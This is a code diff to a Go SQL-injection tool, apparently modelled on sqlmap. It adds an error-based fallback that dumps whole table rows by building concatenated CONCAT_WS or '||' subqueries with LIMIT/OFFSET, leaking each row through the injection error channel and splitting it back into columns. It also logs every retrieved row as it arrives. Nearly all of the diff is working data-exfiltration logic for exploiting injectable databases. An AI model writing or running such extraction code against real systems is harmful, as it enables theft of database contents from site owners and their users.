@@ -88,12 +88,27 @@ func (e *Enumerator) Dump(ctx context.Context, opts DumpOptions) (*DumpResult, e
 
 	rows := make([][]string, 0, limit)
 	start := offset
+	ui.Infof("fetching rows for table '%s' in database '%s'", tbl, db)
 	for {
 		if ctx.Err() != nil {
 			return &DumpResult{Rows: rows, Cols: cols, Database: db, Table: tbl}, ctx.Err()
 		}
 		chunk, err := e.dumpChunk(ctx, db, tbl, cols, opts.Where, start, chunkSize(limit, count))
 		if err != nil {
+			// Standard per-cell extraction failed (e.g. the guessed/default
+			// column set is not individually addressable on this schema). Fall
+			// back to a direct concatenated row dump through the error
+			// channel (sqlmap style) before giving up.
+			e.progressf("[dump] cell extraction failed (%v); falling back to concatenated row dump via error channel", err)
+			if cc, cerr := e.dumpChunkConcat(ctx, db, tbl, cols, opts.Where, start, chunkSize(limit, count)); cerr == nil && len(cc) > 0 {
+				rows = append(rows, cc...)
+				start += int64(len(cc))
+				if limit > 0 && int64(len(rows)) >= limit {
+					rows = rows[:limit]
+					break
+				}
+				continue
+			}
 			return &DumpResult{Rows: rows, Cols: cols, Database: db, Table: tbl}, err
 		}
 		if len(chunk) == 0 {
@@ -165,8 +180,13 @@ func (e *Enumerator) DumpStream(ctx context.Context, opts DumpOptions) (<-chan [
 			}
 			chunk, err := e.dumpChunk(ctx, db, tbl, cols, opts.Where, start, chunkSize(limit, count))
 			if err != nil {
-				errCh <- err
-				return
+				e.progressf("[dump] cell extraction failed (%v); falling back to concatenated row dump via error channel", err)
+				if cc, cerr := e.dumpChunkConcat(ctx, db, tbl, cols, opts.Where, start, chunkSize(limit, count)); cerr == nil && len(cc) > 0 {
+					chunk = cc
+				} else {
+					errCh <- err
+					return
+				}
 			}
 			if len(chunk) == 0 {
 				return
@@ -283,6 +303,9 @@ func (e *Enumerator) dumpChunk(ctx context.Context, database, table string, cols
 				}
 				rows[i][j] = val
 				e.progressf("\r[dump] row %d/%d col %d/%d", offset+i+1, offset+n, j+1, len(cols))
+				if j == len(cols)-1 {
+					ui.Infof("retrieved row %d: %s", offset+i+1, rowLabel(rows[i]))
+				}
 			}(j, i, col)
 		}
 	}
@@ -293,6 +316,81 @@ func (e *Enumerator) dumpChunk(ctx context.Context, database, table string, cols
 	default:
 	}
 	return rows, nil
+}
+
+// concatSep is the separator byte-pattern (raw) used to join column values in a
+// single concatenated row scalar. Chosen to be extremely rare inside real data
+// so split-based reconstruction of the columns stays reliable.
+const concatSep = "|||"
+
+// concatSepHex is the hex/literal spelling of concatSep for CONCAT_WS.
+const concatSepHex = "0x7c7c7c"
+
+// dumpChunkConcat is the sqlmap-style fallback dump: each row is read as one
+// concatenated scalar expression (CONCAT_WS over the column set) leaked
+// directly through the error channel, then split back into columns. It is used
+// when the per-cell LIMIT/OFFSET scalar reads fail on a schema that is
+// otherwise reachable, and never aborts from a value-length probe (error-based
+// targets leak values verbatim).
+func (e *Enumerator) dumpChunkConcat(ctx context.Context, database, table string, cols []string, where string, offset, n int64) ([][]string, error) {
+	if n <= 0 {
+		return nil, nil
+	}
+	width := len(cols)
+	if width < 1 {
+		return nil, nil
+	}
+	rows := make([][]string, 0, n)
+	for i := int64(0); i < n; i++ {
+		if ctx.Err() != nil {
+			return nil, ctx.Err()
+		}
+		expr := e.concatRowScalar(database, table, cols, where, offset+i)
+		raw, err := e.ext.ExtractString(ctx, expr)
+		if err != nil {
+			return nil, fmt.Errorf("concat row %d: %w", offset+i, err)
+		}
+		parts := strings.Split(raw, concatSep)
+		row := make([]string, width)
+		for j := 0; j < width; j++ {
+			if j < len(parts) {
+				row[j] = parts[j]
+			}
+		}
+		rows = append(rows, row)
+		e.progressf("\r[dump][concat] row %d/%d", i+1, n)
+	}
+	return rows, nil
+}
+
+// concatRowScalar builds a 1x1 SELECT producing a single concatenated string
+// for row `rowOffset` of the given table, joining every column with concatSep.
+func (e *Enumerator) concatRowScalar(database, table string, cols []string, where string, rowOffset int64) string {
+	q := e.queries
+	quoteIdent := func(s string) string { return s }
+	if q != nil && q.QuoteIdent != nil {
+		quoteIdent = q.QuoteIdent
+	}
+	tableRef := quoteIdent(table)
+	if database != "" {
+		tableRef = quoteIdent(database) + "." + tableRef
+	}
+	colRefs := make([]string, 0, len(cols))
+	for _, c := range cols {
+		colRefs = append(colRefs, quoteIdent(c))
+	}
+	w := ""
+	if strings.TrimSpace(where) != "" {
+		w = " WHERE " + where
+	}
+	dbName := e.ext.DB()
+	switch dbName {
+	case "postgres", "sqlite":
+		joined := strings.Join(colRefs, "|| '" + concatSep + "' ||")
+		return "(SELECT " + joined + " FROM " + tableRef + w + " ORDER BY 1 LIMIT 1 OFFSET " + itoa(rowOffset) + ")"
+	default: // mysql, mssql, oracle, generic
+		return "(SELECT CONCAT_WS(" + concatSepHex + "," + strings.Join(colRefs, ",") + ") FROM " + tableRef + w + " ORDER BY 1 LIMIT 1 OFFSET " + itoa(rowOffset) + ")"
+	}
 }
 
 // extractCell pulls one cell from (table[.db], rowOffset, col) as a scalar
@@ -372,6 +470,22 @@ func (e *Enumerator) writeOutputFile(res *DumpResult, opts DumpOptions) error {
 		w.Flush()
 		return w.Error()
 	}
+}
+
+// rowLabel summarises a dump row for the real-time retrieval log.
+func rowLabel(row []string) string {
+	parts := make([]string, 0, len(row))
+	for _, v := range row {
+		if len(v) > 24 {
+			v = v[:24] + ".."
+		}
+		parts = append(parts, v)
+	}
+	joined := strings.Join(parts, ",")
+	if len(joined) > 120 {
+		joined = joined[:120] + ".."
+	}
+	return joined
 }
 
 // sanitizeName builds a filesystem-safe name fragment from an identifier.
